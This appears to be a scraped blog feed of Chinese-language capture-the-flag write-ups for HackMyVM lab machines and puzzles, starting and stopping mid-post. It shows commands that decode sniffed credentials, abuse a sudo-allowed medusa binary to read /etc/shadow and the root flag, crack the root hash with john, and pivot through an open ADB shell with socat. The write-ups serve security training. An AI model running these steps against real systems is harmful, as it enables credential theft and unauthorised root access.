_......Z
09:50:24.003898 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [P.], seq 1:2113, ack 573, win 501, length 2112: HTTP: HTTP/1.1 200 OK
E....R@.@............P.F..p...&amp;.P.......HTTP/1.1 200 OK
Date: Mon, 07 Jul 2025 13:50:24 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1859
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

...........X}o.6...|.....R!@..G.[....M...6M..L........n....v.!.J7R)........W..n.~...H'.UcT.(    .....f:.W....aB?gTi*G.[u.J?...7.....z5.Pp.      I...!\KF..P.........    Yv.,....z.tY..s.....i.... `|&gt;........Rd&lt;..'.r...ss......&gt;.K.....6.'b........I..)To{..Q.   ..(8H..G....i.N.....D...Q.-OOOke.       .E2.L..Y..)..dE..Ph.&lt;.2../.dl..M...4&amp;..aL+...t7...L...R:nj.....Q.xx|.;.;..;k..A..eg...2.........&lt;..~.^1..H+......Km13..h*..t...0._.H..g..w..6.$UY.1...1..'.......I....5BLCmMP....:A9..G..-......X1|..P.09...
...^.u.4...B....5.S[6*....A.\u0..[.^v'...6....a...,..............6C;*%&gt;...;.I...#/..#....i.y#....c....jA.uc.E....L!......1B.KT..'TG'.7..&gt;=. ,.-.P*.....3.7.c....Q.q..T..e.3(M.F3.......6A..L.....C...Y.t..=.~.7...z.9.....z...(.d]I..E.W7....(...!..t...&lt;....A...Ew.;.......[.v.(]..L..,..R.......a.\....w(@...o.\&amp;..h.C....v.&gt;....1MP[.......}....E...,Mi.Z..Y.L........5.BKH......,.1.w...'.R|..J...O..D^B......u....4....6.........[.S.h(...%t.......9...N&gt;.x.....s&amp;.e..s...R...w....S..$.......o~....b.S\...0.....iJp.gq..TJ!.......d
t.%,........fDE.a+......2,.:.....Bh......t..V-w*...........
yt.b1..z..V9j....7.N.....{9.-g....n2.......m....r.-3L.}-#:,....@o...XfMYjC.
..St.bA..G.c..9.3;dA.W..Q.+.X.nQ...z....?..=a..tw.a..&lt;DL..a..b.1m.      ....%.&amp;qw..y.Q.d...6......D..w....;BrN..1D...........y.6.......c^.`{C&lt;c.W.`{[....b..,.2.....|.s-.J....).S........e....,...$.&amp;...X7+.m....!.........8...i .eA(Eb...b..2..{.s.I..5L./b...4..L.w.S)|...5|.:/..G.m..x.AU;..WLM...L..U..k....8+,8X6.&gt;.(.$1i6...,..[.....N.D.....$.}$&amp;&lt;.vcS.O.o...B&gt;...&amp;`...^b:b..m...    '..B..
[.......'...:.p..       .D..TDf..c^B...%../B.Y.c...E....T2.....1.....&gt;....b...+...T+...yGr..........Z.O7....~.........n~...........t.....QZ...Cp(%...P.TG..yg.F.l..........)....E..Rn.g...L.......T.D~.:.P..B...X....Z.o/.....X..'Fq1.....f^..UUx.O.....|N.'/.@'.w.E.....k....=~.V.w........~.4.&gt;...#;.....#.6..)...g...Q.+^7N...H....d...[..o._$..C....
09:50:24.004210 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [.], ack 2113, win 513, length 0
E..(..@..............F.P..&amp;...x.P...|.........
^C
30 packets captured
30 packets received by filter
0 packets dropped by kernel
                     
```

Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==



base64解一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==' |base64 -d
cnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8                                  
```

登录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh cnhyk@192.168.205.167           
The authenticity of host '192.168.205.167 (192.168.205.167)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.167' (ED25519) to the list of known hosts.
cnhyk@192.168.205.167's password: 
Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cnhyk@Basic:~$ id
uid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)
cnhyk@Basic:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for cnhyk: 
Sorry, user cnhyk may not run sudo on Basic.
```

找提权点

```
cnhyk@Basic:~$ cat user.txt 
flag{user-df31759540dc28f75a20f443a19b1148}
cnhyk@Basic:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
cnhyk@Basic:~$ ss -tulnp
Netid               State                Recv-Q               Send-Q                             Local Address:Port                               Peer Address:Port               
udp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:*                  
tcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:*                  
tcp                 LISTEN               0                    128                                         [::]:22                                         [::]:*                  
tcp                 LISTEN               0                    128                                            *:80                                            *:*                  
cnhyk@Basic:~$ cd /opt/
cnhyk@Basic:/opt$ ls -al
total 28
drwxr-xr-x  2 root root  4096 Jul  6 09:21 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rwx--x--x  1 root root 17016 Jul  6 09:21 jojo
cnhyk@Basic:/opt$ ./jojo 
问题 1: 请输入 80+87
80+87
正确！
问题 2: 请输入 57+91
^C
```

我愿称之为伪人测试，哈哈哈（纯开玩笑，没有冒犯的意思）

```
cnhyk@Basic:/tmp$ cat a.py 
cat a.py 
#!/usr/bin/env python3
import subprocess
import sys

JOJO_EXECUTABLE = '/opt/jojo'

def slv():
    print(f'[+] 正在启动目标程序: {JOJO_EXECUTABLE}')

    try:
        cmd = ['stdbuf', '-oL', JOJO_EXECUTABLE]
        p = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        print(f'[!] 错误：找不到程序 '{JOJO_EXECUTABLE}' 或 'stdbuf'。请检查。')
        sys.exit(1)

    print('[+] 连接成功！开始自动化交互...\n')

    while True:
        l = p.stdout.readline()
        if not l:
            break
        print(l.strip())

        if '请输入' in l:
            try:
                q = l.split('请输入 ')[1].strip()
                ans = q
                print(f'[*] 检测到问题，提取内容: {ans}')
                print(f'[*] 自动输入: {ans}')
                p.stdin.write(ans + '\n')
                p.stdin.flush()
                print('-' * 20)
            except IndexError:
                print('[!] 警告：无法从行中解析问题。')

    p.wait()
    print(f'\n[+] 交互结束。程序退出，返回码: {p.returncode}')

if __name__ == '__main__':
    slv()
```

执行

```
cnhyk@Basic:/tmp$ python3 $_
python3 $_
[+] 正在启动目标程序: /opt/jojo
[+] 连接成功！开始自动化交互...

问题 1: 请输入 61+34
[*] 检测到问题，提取内容: 61+34
[*] 自动输入: 61+34
--------------------
省略
--------------------
正确！
问题 500: 请输入 95+68
[*] 检测到问题，提取内容: 95+68
[*] 自动输入: 95+68
--------------------
正确！
jojo:jojo

[+] 交互结束。程序退出，返回码: 0
```

jojo:jojo，啊这所以我一开始测试弱密码就不用写代码了......

```
jojo@Basic:/tmp$ id
uid=1001(jojo) gid=1001(jojo) groups=1001(jojo)
jojo@Basic:/tmp$ sudo -l
Matching Defaults entries for jojo on Basic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jojo may run the following commands on Basic:
    (ALL) NOPASSWD: /usr/bin/medusa
```

显而易见了，这是一个密码爆破工具，所以它读取字典大概是有问题的

```
jojo@Basic:/tmp$ sudo /usr/bin/medusa --help
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

/usr/bin/medusa: invalid option -- '-'
CRITICAL: Unknown error processing command-line options.
ALERT: User logon information must be supplied.

Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
                 different parameter each time and they will all be sent to the module (i.e.
                 -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process 
                 the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan
```

利用

```
jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /root/root.txt -v 64
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1
GENERAL: Total Passwords: 1
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: flag{root-c065860911bb44a2483c096cbd203df9} (1 of 1 complete)
GENERAL: Medusa has finished.
jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /etc/shadow -v 64
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1
GENERAL: Total Passwords: 27
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root:$6$sshVeDa7z638dY8S$ZrwHy6TQ8VMkgSx1mGhCPG8Lffedn9LbDPcgCoQdF877zeXPR.NGhm20RlipL5s0HfPQByfwXyVXnM1giQ9tX0:20275:0:99999:7::: (1 of 27 complete)
^CALERT: Medusa received SIGINT - Sending notification to login threads that we are are aborting.
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: daemon:*:20166:0:99999:7::: (2 of 27 complete)
ALERT: To resume scan, add the following to your original command: '-Z h1u1.'
```

爆破hash

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                         
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
budayday         (root)     
1g 0:00:00:36 DONE (2025-07-07 11:16) 0.02707g/s 27110p/s 27110c/s 27110C/s buldogs..brittany_
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
```

所以说

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ grep -w -n 'budayday' /usr/share/wordlists/rockyou.txt                                                                                                
999993:budayday
                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'budayday' &gt; pass                                                                                                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh root@192.168.205.167                                       
root@192.168.205.167's password: 
Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul  6 08:23:47 2025 from 192.168.3.94
root@Basic:~# id
uid=0(root) gid=0(root) groups=0(root)
```

你硬跑应该跑的出来，我浅跑了500行没有限制

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Basic.html</guid><pubDate>Mon, 07 Jul 2025 15:25:27 +0000</pubDate></item><item><title>Challenge 057</title><link>https://7r1UMPHK.github.io/post/Challenge%20057.html</link><description>![image-20250705222109182](https://7r1umphk.github.io/image/20250705222109387.webp)

```
鵷𓁥鑥陨驶𖥟𓍯靟驥鑮𒅲汪潟ᔩ Ex: HMV{Flag}
```

字符依然是超宽 Unicode，很像上道题。
含有多种语系字符 汉字、埃及象形、阿拉伯、罕见 CJK 扩展

https://www.better-converter.com/Encoders-Decoders/Base65536-Decode

![image-20250705222147026](https://7r1umphk.github.io/image/20250705222147304.webp)

```
where_have_you_been_rpj7_:)
```

小彩蛋，之前那个出base2048的就是rpj7sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20057.html</guid><pubDate>Sat, 05 Jul 2025 14:35:12 +0000</pubDate></item><item><title>Challenge 056</title><link>https://7r1UMPHK.github.io/post/Challenge%20056.html</link><description>![image-20250705220557455](https://7r1umphk.github.io/image/20250705220557660.webp)

```
&lt;pre&gt; նҿԈೡ౾ଳߦϻݧWطಧÆѕఊ۷ܔѤɦධʪкೞƝݩবđӌࠒબຢԩݙυࢲڵࡔत Hint: Base what? &lt;/pre&gt;
```

提示base
全是 Unicode 字符
明显不是 base64、base32、base58 等常见编码
包含南亚,阿拉伯,泰文等字符：可能属于**“超大基数编码”**（例如 base1024、base2048）。
所以扒拉吧

https://nerdmosis.com/tools/encode-and-decode-base2048

![image-20250705220651285](https://7r1umphk.github.io/image/20250705220651530.webp)

```
The flag you are looking for is just 'HMV{Base2048}'
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20056.html</guid><pubDate>Sat, 05 Jul 2025 14:33:20 +0000</pubDate></item><item><title>Challenge 055</title><link>https://7r1UMPHK.github.io/post/Challenge%20055.html</link><description>![image-20250705214803760](https://7r1umphk.github.io/image/20250705214803963.webp)

```
&lt;pre&gt; MCZJ/CJ[[J]\.7¿?;(?9!?-\/&lt;;¿:=(=6!?-X K: wtf &lt;/pre&gt;
```

有点谜语人，是XOR
我的强行理解就是
看起来乱，但都是ASCII可打印字符
有key
有?
没有明显 base64/hex 特征

![image-20250705220022860](https://7r1umphk.github.io/image/20250705220022997.webp)

![image-20250705220038576](https://7r1umphk.github.io/image/20250705220039230.webp)

HMV{CAP}sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20055.html</guid><pubDate>Sat, 05 Jul 2025 14:30:52 +0000</pubDate></item><item><title>Challenge 054</title><link>https://7r1UMPHK.github.io/post/Challenge%20054.html</link><description>![image-20250705190326651](https://7r1umphk.github.io/image/20250705190326857.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -v http://momo.hackmyvm.eu/f0rw4rd  
* Host momo.hackmyvm.eu:80 was resolved.
* IPv6: (none)
* IPv4: 5.45.101.64
*   Trying 5.45.101.64:80...
* Connected to momo.hackmyvm.eu (5.45.101.64) port 80
* using HTTP/1.x
&gt; GET /f0rw4rd HTTP/1.1
&gt; Host: momo.hackmyvm.eu
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 301 Moved Permanently
&lt; Server: nginx/1.18.0
&lt; Date: Sat, 05 Jul 2025 11:03:36 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 169
&lt; Location: http://momo.hackmyvm.eu/f0rw4rd/
&lt; Connection: keep-alive
&lt; 
&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
* Connection #0 to host momo.hackmyvm.eu left intact
                                                                     
```

这挑战也是见鬼

也是不行

https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/Challenges/Web/054

巨魔佬可以复现，我复现不了，不管了，搁着

```
HMV{Pay-it-FORWARD-x!}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20054.html</guid><pubDate>Sat, 05 Jul 2025 14:25:59 +0000</pubDate></item><item><title>Challenge 053</title><link>https://7r1UMPHK.github.io/post/Challenge%20053.html</link><description>![image-20250705184956768](https://7r1umphk.github.io/image/20250705185005753.webp)

https://hackmyvm.eu/challenges/challenge.php?c=053

```
&lt;pre&gt; 9950b5c66f8518f8b012359dc7390589 c03ec75734f58d87cddff35c57786429 e757e84e31ef68a74d86d6b52478654c HMV{c761d942cf5fe4ba9ece382739afef4e} &lt;/pre&gt;
```

看着像hash

![image-20250705185544591](https://7r1umphk.github.io/image/20250705185544745.webp)

像找规律，生成字典

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ crunch 7 7 -t 1@@@@@4 -o pass                  
Crunch will now generate the following amount of data: 95051008 bytes
90 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 11881376 

crunch: 100% completed generating output
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 pass
1zzzzz4
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ head -n 1 pass               
1aaaaa4
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=pass --format=raw-md5 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
1lordp4          (?)     
1g 0:00:00:00 DONE (2025-07-05 07:02) 9.090g/s 48041Kp/s 48041Kc/s 48041KC/s 1loqiq4..1lormd4
Use the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably
Session completed. 
                      
```

HMV{1lordp4}sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20053.html</guid><pubDate>Sat, 05 Jul 2025 14:25:39 +0000</pubDate></item><item><title>hmv_Fuzzz</title><link>https://7r1UMPHK.github.io/post/hmv_Fuzzz.html</link><description>```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                   
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.163 08:00:27:38:b0:90       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e4:9a:30       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.285 seconds (112.04 hosts/sec). 4 responded
                                                                                                   
```

192.168.205.163

服务探测

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5555/tcp open  freeciv
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds                       

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p5555 -sV 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge (token auth required)
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
```

adb，连接上去

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb connect 192.168.205.163:5555
connected to 192.168.205.163:5555
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb devices                     
List of devices attached
192.168.205.163:5555    device

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb shell  
/ $ id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
/ $ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for runner: 
sudo: a password is required
/ $ cd 
~ $ ls -al
total 8
drwx------    2 runner   runner        4096 May 19 09:08 .
drwxr-xr-x    4 root     root          4096 May 19 10:02 ..
lrwxrwxrwx    1 root     runner           9 May 19 09:08 .ash_history -&gt; /dev/null
~ $ ss -tnlp
/bin/sh: ss: not found
~ $ netstat -lntup
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2513/python3
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
```

传一个socat转发端口(这里的socat需要静态编译的，它这个靶机貌似是alpine的，所以你直接拉kali的socat是不行的，自己去网上下一个，有编译好的)

```
~ $ wget 192.168.205.128/socat
Connecting to 192.168.205.128 (192.168.205.128:80)
saving to 'socat'
socat                100% |********************************| 4724k  0:00:00 ETA
'socat' saved
~ $ chmod +x socat
~ $ ./socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &amp;
```

看看服务转发出来没有（这个shell会自动断开，所以如果断开重新连就好了，反正就传一个socat上去）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p8000 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:13 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00032s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

访问

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000          
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000 -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
```

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.163:8000 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/x/reports/http_192.168.205.163_8000/_25-07-01_20-18-36.txt

Target: http://192.168.205.163:8000/

[20:18:36] Starting: 

Task Completed
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/line                 (Status: 200) [Size: 0]
/line2                (Status: 200) [Size: 0]
/line1                (Status: 200) [Size: 0]
Progress: 35450 / 1102800 (3.21%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 36260 / 1102800 (3.29%)
===============================================================
Finished
===============================================================
```

这里我停了，因为它爆破出来的/line有点像分开藏东西

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000/line -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000/line/ -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line/ HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 404 NOT FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 207
&lt; 
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 465323 / 1102800 (42.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 466276 / 1102800 (42.28%)
===============================================================
Finished
===============================================================                   
```

看看其他的

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line1
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line1 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
